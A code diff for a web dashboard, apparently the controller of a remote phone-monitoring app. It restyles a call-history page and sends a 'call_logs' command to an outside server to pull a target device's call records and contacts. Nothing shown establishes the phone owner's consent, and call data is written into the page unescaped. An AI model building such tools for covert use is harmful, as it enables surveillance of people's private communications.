@@ -7,83 +7,112 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.1);
-            --glass-border: rgba(255, 255, 255, 0.2);
+            --bg-color: #000000;
+            --glass-bg: rgba(28, 28, 30, 0.6); /* iPhone Dark Mode feel */
+            --glass-border: rgba(255, 255, 255, 0.15);
             --text-main: #ffffff;
-            --text-muted: #aaaaaa;
-            --incoming: #4caf50;
-            --outgoing: #ff9800;
-            --missed: #f44336;
+            --text-sub: #8e8e93; /* iOS Gray */
+            --incoming: #30d158; /* iOS Green */
+            --outgoing: #0a84ff; /* iOS Blue */
+            --missed: #ff453a;   /* iOS Red */
         }
 
         body {
             background-color: var(--bg-color);
-            background-image: linear-gradient(45deg, #000000, #1a1a1a);
+            background-image: linear-gradient(135deg, #000000 0%, #1c1c1e 100%);
             color: var(--text-main);
-            font-family: 'Segoe UI', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             margin: 0; padding: 20px;
             display: flex; justify-content: center;
         }
 
         .container {
-            width: 100%; max-width: 500px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px; padding: 20px;
-            border: 1px solid var(--glass-border);
-            min-height: 80vh;
+            width: 100%; max-width: 480px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 40px; padding: 20px;
+            /* No visible border for cleaner look */
+            min-height: 85vh;
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
         }
 
         .header {
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 25px; padding-bottom: 15px;
-            border-bottom: 1px solid var(--glass-border);
+            margin-bottom: 20px; padding: 0 10px 15px 10px;
+            border-bottom: 0.5px solid var(--glass-border);
         }
 
         .back-btn {
-            color: var(--text-main); font-size: 1.2rem;
-            text-decoration: none; width: 40px; height: 40px;
-            background: var(--glass-bg); border-radius: 50%;
+            color: var(--text-main); font-size: 1.1rem;
+            text-decoration: none; width: 35px; height: 35px;
             display: flex; align-items: center; justify-content: center;
         }
 
-        .page-title { font-size: 1.2rem; font-weight: bold; }
+        .page-title { font-size: 1.1rem; font-weight: 600; letter-spacing: 0.5px; }
         
         .refresh-btn {
-            background: var(--glass-bg); border: 1px solid var(--glass-border);
-            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer;
+            background: transparent; border: none;
+            color: var(--text-main); font-size: 1.1rem; cursor: pointer;
         }
 
         .log-list { 
-            display: flex; flex-direction: column; gap: 10px; 
-            max-height: 600px; overflow-y: auto; padding-right: 5px;
+            display: flex; flex-direction: column; gap: 0px; /* iOS lists have no gap usually */
+            max-height: 650px; overflow-y: auto; 
         }
         
-        .log-list::-webkit-scrollbar { width: 5px; }
-        .log-list::-webkit-scrollbar-thumb { background: var(--glass-border); border-radius: 10px; }
+        /* Hide scrollbar for cleaner look */
+        .log-list::-webkit-scrollbar { width: 0px; background: transparent; }
 
         .log-card {
-            background: var(--glass-bg); padding: 12px 15px;
-            border-radius: 12px; display: flex; align-items: center;
-            border: 1px solid var(--glass-border); transition: 0.2s;
+            padding: 12px 10px;
+            display: flex; align-items: center;
+            border-bottom: 0.5px solid rgba(255,255,255,0.1);
+            transition: 0.2s;
         }
-        .log-card:hover { transform: translateX(3px); background: rgba(255,255,255,0.15); }
+        
+        .log-card:active { background: rgba(255,255,255,0.1); }
 
         .log-icon {
-            font-size: 1rem; margin-right: 15px; width: 35px; height: 35px;
+            font-size: 0.9rem; margin-right: 15px; width: 30px; height: 30px;
             display: flex; align-items: center; justify-content: center;
-            background: rgba(255,255,255,0.05); border-radius: 50%; flex-shrink: 0;
+            flex-shrink: 0;
         }
         
-        .log-icon.incoming { color: var(--incoming); }
-        .log-icon.outgoing { color: var(--outgoing); }
+        .log-icon.incoming { color: var(--text-sub); } /* iOS often uses neutral for history icons unless missed */
+        .log-icon.outgoing { color: var(--text-sub); }
         .log-icon.missed { color: var(--missed); }
 
-        .log-info { flex: 1; overflow: hidden; }
-        .log-number { font-size: 1rem; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-        .log-meta { font-size: 0.75rem; color: var(--text-muted); margin-top: 4px; display: flex; gap: 10px; }
+        .log-info { flex: 1; overflow: hidden; display: flex; flex-direction: column; justify-content: center; }
         
-        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
+        /* Typography Changes */
+        .log-name { 
+            font-size: 1.05rem; font-weight: 600; 
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+            color: var(--text-main);
+        }
+        
+        .log-name.is-missed { color: var(--missed); } /* Red text for missed calls */
+
+        .log-details-row {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 0.8rem; color: var(--text-sub); margin-top: 3px;
+        }
+
+        .log-type-icon { font-size: 0.7rem; }
+
+        /* Direct Call Button */
+        .call-action {
+            width: 40px; height: 40px;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--outgoing);
+            font-size: 1.2rem;
+            text-decoration: none;
+            margin-left: 10px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 50%;
+        }
+
+        .status-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
     </style>
 </head>
 <body>
@@ -91,7 +120,7 @@
     <div class="container">
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-            <span class="page-title">Call History</span>
+            <span class="page-title">Recents</span>
             <button onclick="fetchLogs()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i></button>
         </div>
 
@@ -101,29 +130,65 @@
 
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com";
-        
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id');
         const storageKey = `calls_${DEVICE_ID}`;
+        const contactsKey = `contacts_${DEVICE_ID}`; // Is key se contacts uthayenge
 
         document.addEventListener("DOMContentLoaded", () => {
             if (!DEVICE_ID) {
-                alert("Bhai, ID missing hai! Dashboard se aao.");
+                alert("ID Missing! Redirecting...");
                 window.location.href = "index.html";
                 return;
             }
-
-            // 1. Initial Load
             loadFromStorage();
             sendCommand();
             setTimeout(fetchLogs, 2000); 
-
-            // 2. LIVE AUTO REFRESH: Har 10 second mein khud refresh hoga
-            setInterval(() => {
-                console.log("Auto-refreshing logs...");
-                fetchLogs();
-            }, 10000); 
+            setInterval(fetchLogs, 10000); // 10 sec auto-refresh
         });
+
+        // 1. HELPERS: Date Formatting (Today/Yesterday)
+        function formatSmartDate(timestamp) {
+            if (!timestamp) return "Unknown";
+            const date = new Date(parseInt(timestamp));
+            const now = new Date();
+            const yesterday = new Date(now);
+            yesterday.setDate(yesterday.getDate() - 1);
+
+            const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
+            if (date.toDateString() === now.toDateString()) {
+                return `Today, ${timeStr}`;
+            } else if (date.toDateString() === yesterday.toDateString()) {
+                return `Yesterday, ${timeStr}`;
+            } else {
+                return date.toLocaleDateString() + ", " + timeStr;
+            }
+        }
+
+        // 2. HELPERS: Name Matcher
+        function findContactName(phoneNumber) {
+            try {
+                const storedContacts = localStorage.getItem(contactsKey);
+                if (!storedContacts) return null;
+                
+                const contacts = JSON.parse(storedContacts);
+                // Clean the log number (remove spaces/dashes for comparison)
+                const cleanLogNum = phoneNumber.replace(/\D/g, '').slice(-10); 
+
+                // Check contacts
+                const match = contacts.find(c => {
+                    if(!c.phone) return false;
+                    const cleanContactNum = c.phone.replace(/\D/g, '').slice(-10);
+                    return cleanContactNum === cleanLogNum;
+                });
+
+                return match ? match.name : null;
+            } catch (e) {
+                console.error("Error matching contacts", e);
+                return null;
+            }
+        }
 
         function loadFromStorage() {
             const savedData = localStorage.getItem(storageKey);
@@ -132,8 +197,8 @@
             } else {
                 document.getElementById("logsContainer").innerHTML = `
                     <div class="status-msg">
-                        <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
-                        <p>Requesting Call Logs...</p>
+                        <i class="fa-solid fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
+                        <p>Loading History...</p>
                     </div>`;
             }
         }
@@ -143,7 +208,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: 'call_logs' })
-            }).then(() => console.log("Call Logs Command Sent"));
+            }).then(() => console.log("Command Sent"));
         }
 
         function fetchLogs() {
@@ -158,48 +223,70 @@
                         renderLogs(data);
                     }
                 })
-                .catch(err => console.log("Waiting for server..."))
+                .catch(err => console.log("Fetch error"))
                 .finally(() => {
                     if(btn) btn.innerHTML = '<i class="fa-solid fa-rotate"></i>';
                 });
         }
 
+        // 3. LOGIC: Main Render Function
         function renderLogs(data) {
             const container = document.getElementById("logsContainer");
             if(!container) return;
             container.innerHTML = ""; 
 
+            // Sort by latest first
+            data.sort((a, b) => b.date - a.date);
+
             data.forEach(log => {
-                let iconClass = "incoming";
-                let iconName = "fa-arrow-down-left";
                 const type = (log.type || "").toLowerCase();
+                let iconClass = "incoming";
+                let iconSymbol = "fa-phone-arrow-down-left"; // Incoming
+                let isMissed = false;
 
                 if(type.includes("outgoing")) {
                     iconClass = "outgoing";
-                    iconName = "fa-arrow-up-right";
+                    iconSymbol = "fa-phone-arrow-up-right"; // Outgoing
                 } else if(type.includes("missed") || type.includes("rejected")) {
                     iconClass = "missed";
-                    iconName = "fa-phone-slash";
+                    iconSymbol = "fa-phone-slash"; // Missed
+                    isMissed = true;
                 }
 
-                let displayDate = log.date;
-                if (!isNaN(log.date)) {
-                    displayDate = new Date(parseInt(log.date)).toLocaleString();
-                }
+                // Name Matching Logic
+                const matchedName = findContactName(log.number);
+                
+                // Display Logic: 
+                // Agar Naam hai: Naam (Bada) + Label "Mobile"
+                // Agar Naam nahi: Number (Bada) + Label "Unsaved"
+                const primaryText = matchedName ? matchedName : log.number;
+                const secondaryText = matchedName ? "Mobile" : "Unsaved"; 
+                
+                // Missed call red color class
+                const nameColorClass = isMissed ? "is-missed" : "";
+                
+                // Formatted Date
+                const prettyDate = formatSmartDate(log.date);
 
                 container.innerHTML += `
                     <div class="log-card">
                         <div class="log-icon ${iconClass}">
-                            <i class="fa-solid ${iconName}"></i>
+                            <i class="fa-solid ${iconSymbol}"></i>
                         </div>
+
                         <div class="log-info">
-                            <div class="log-number">${log.name || log.number || "Unknown"}</div>
-                            <div class="log-meta">
-                                <span>${displayDate || "Unknown"}</span>
+                            <div class="log-name ${nameColorClass}">${primaryText}</div>
+                            <div class="log-details-row">
+                                <span class="log-type-icon"><i class="fa-solid ${type.includes('outgoing') ? 'fa-arrow-turn-up' : 'fa-arrow-turn-down'}"></i></span>
+                                <span>${secondaryText}</span>
                                 <span>•</span>
-                                <span>${log.duration || "0s"}</span>
+                                <span>${prettyDate}</span>
                             </div>
                         </div>
+
+                        <a href="tel:${log.number}" class="call-action">
+                            <i class="fa-solid fa-phone"></i>
+                        </a>
                     </div>`;
             });
         }
